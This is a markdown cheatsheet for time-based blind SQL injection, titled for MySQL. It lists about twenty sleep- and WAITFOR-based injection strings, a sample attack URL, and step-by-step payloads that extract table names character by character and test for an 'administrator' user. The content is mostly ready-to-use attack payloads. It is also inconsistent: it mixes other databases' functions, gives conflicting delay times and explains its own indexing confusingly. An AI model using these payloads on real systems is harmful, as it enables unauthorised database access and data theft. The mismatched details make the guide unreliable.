# MySQL Time based SQL Injection Cheatsheet
  
  This is almost the same technique followed as [Blind Based SQLi](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi)
  
  ## Detecting the vulnerability
  The following stacked query detects if the website if vulnerable to Time Based SQL injection, by checking the website time response. The following condition is True because 1=1, which later executes the sleep function, so a 10 seconds delay is what we are expenting on the website's response.
  
  ```sql
  SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
  'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
  1'=sleep(25)='1
  '%2b(select*from(select(sleep(2)))a)%2b'
  WAITFOR DELAY '0:0:25';--
  OR SLEEP(25)
  AND SLEEP(25) AND ('kleiton'='kleiton
  WAITFOR DELAY '0:0:25' and 'a'='a;--
  IF 1=1 THEN dbms_lock.sleep(25);
  SLEEP(25)
  pg_sleep(25)
  and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--
  DBMS_LOCK.SLEEP(25);
  AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:25'--
  1,'0');waitfor delay '0:0:25;--
  (SELECT 1 FROM (SELECT SLEEP(25))A)
  %2b(select*from(select(sleep(25)))a)%2b'
  /**/xor/**/sleep(25)
  or (sleep(25)+1) limit 1 --
  ```
  
  Example:
  ```http://domain.com/index.php?id=15'XOR(if(now()=sysdate(),sleep(5*5),0))OR'```  
  If the websites response is ~15 seconds, it means it is vulnerable to this kind of attack.
  
  ![ascii_table](https://www.asciitable.com/asciifull.gif)
   
  **Retrieving name of all tables name**
  
  Find the first character of the first table:
  ```sql
  and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
  ```
  
  Find the second character of the first table:
```sql
and if((select substr(table_name,2,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
```

  Find the third character of the first table:
```sql
and if((select substr(table_name,3,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
```

Find the first character of the second table:
```sql
and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 1,1)='a', sleep(10), null)--
```

Find the second character of the second table:
```sql
and if((select substr(table_name,2,1) from information_schema.tables where table_schema=database() limit 1,1)='a', sleep(10), null)--
```

So if you have realised by far, we are using this logic:
limit **3**,1 -> the number of the table (targeting the third character)
table_name,**3**,1 -> the number of the character in the table (targeting the fourth character of the table [the first character starts from 0, not 1])
  
  ***Alternative way of finding columns name by bruteforcing them***
  
  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--+```  
  If the username **administrator** exists, you should except a response delay of 10 seconds, otherwise keep trying other methods.
